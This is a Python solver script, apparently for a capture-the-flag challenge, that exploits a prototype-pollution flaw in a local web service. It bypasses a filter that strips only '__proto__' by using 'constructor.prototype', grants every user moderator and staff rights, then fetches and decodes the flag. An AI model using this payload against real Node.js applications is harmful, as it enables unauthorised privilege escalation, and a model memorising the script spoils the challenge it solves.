import base64
import os
import uuid

import requests

HOST = os.environ.get("SERVICE_DIRTY_WATERS_WEB_HOST", "127.0.0.1")
PORT = os.environ.get("SERVICE_DIRTY_WATERS_WEB_PORT", "3000")
BASE_URL = f"http://{HOST}:{PORT}"

# Built from scratch (no author checker).
#
# /api/settings/import recursively merges an arbitrary player-supplied
# JSON object into the logged-in user's `preferences` (applyThemePatch
# in store.ts). normalizeImportPayload only strips the literal
# "__proto__" key -- it never blocks "constructor"/"prototype" -- so a
# payload like {"constructor": {"prototype": {...}}} walks straight
# into the shared Object.prototype via normal JS property lookup,
# letting us pollute every plain object application-wide, including
# brand-new user records that never explicitly set a given property.
#
# /api/mod/logs/export only gates on `user.permissions?.moderator` and
# `user.badges.includes("staff")`; a fresh self-registered user has
# neither property set directly, so after polluting
# Object.prototype.permissions = {moderator: true} and
# Object.prototype.badges = ["staff"], those checks now fall through
# the prototype chain and succeed for ANY user, no real admin
# credentials needed.
#
# The endpoint still obfuscates the flag as 3 parts, each
# base64(rot13(reversed(part))) -- reverse that per part and
# concatenate.


def decode_part(part):
    raw = base64.b64decode(part).decode()

    def rot13(s):
        out = []
        for c in s:
            if c.isalpha():
                base = ord("Z") if c.isupper() else ord("z")
                out.append(chr((ord(c) - (base - 25) + 13) % 26 + (base - 25)))
            else:
                out.append(c)
        return "".join(out)

    return rot13(raw)[::-1]


s = requests.Session()
username = f"attacker{uuid.uuid4().hex[:8]}"
r = s.post(f"{BASE_URL}/api/auth/register", json={"username": username, "password": "password123"})
r.raise_for_status()

payload = {
    "config": {
        "constructor": {
            "prototype": {
                "permissions": {"moderator": True},
                "badges": ["staff"],
            }
        }
    }
}
r = s.post(f"{BASE_URL}/api/settings/import", json=payload)
r.raise_for_status()

r = s.get(f"{BASE_URL}/api/mod/logs/export")
r.raise_for_status()
data = r.json()

parts = data["archive"]["payload"]
flag = "".join(decode_part(p) for p in parts)
print(flag)

flag_env = os.environ.get("flag_flag")
if flag_env and flag_env not in flag:
    raise SystemExit(f"flag mismatch: expected {flag_env!r} to be in {flag!r}")
